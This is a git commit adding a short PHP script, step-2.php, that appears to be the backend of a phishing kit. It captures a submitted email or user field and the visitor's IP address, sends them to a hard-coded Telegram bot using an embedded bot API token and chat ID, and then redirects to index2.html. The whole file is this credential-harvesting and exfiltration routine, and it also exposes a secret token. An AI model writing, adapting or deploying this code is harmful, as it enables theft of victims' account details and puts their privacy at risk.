f1d556add3d3b3c90059460a458567ae379a468c
franck21368767 <jasondjsbs@gmail.com>
2024-08-28 18:32:26 -0500

    Add files via upload

---
+++ step-2.php
@@ -0,0 +1,27 @@
+<?php
+// Recoger los datos del formulario
+$correo = $_POST['nombre'];
+
+
+$ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente
+
+// API key del chatbot de Telegram
+$bot_api_key = '7035738467:AAGFFEZgbQtUmDD97yRdADdsLp04BIJPmeI';
+
+// ID del chat al que se enviará el mensaje
+$chat_id = '-1002214525990';
+
+// Mensaje que se enviará al chatbot
+$mensaje_para_chatbot = "👤 Usuario🔐🇻🇪\n" . "👤 Usar: " . $correo .  "\n🌏: " . $ip; "\n🌏🌐🗺️: " . $ip;
+
+// URL de la API de Telegram para enviar mensajes
+$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);
+
+// Enviar el mensaje al chatbot de Telegram
+$response = file_get_contents($telegram_url);
+
+// Redirigir a index.php
+header("Location: index2.html");
+exit;
+
+?>
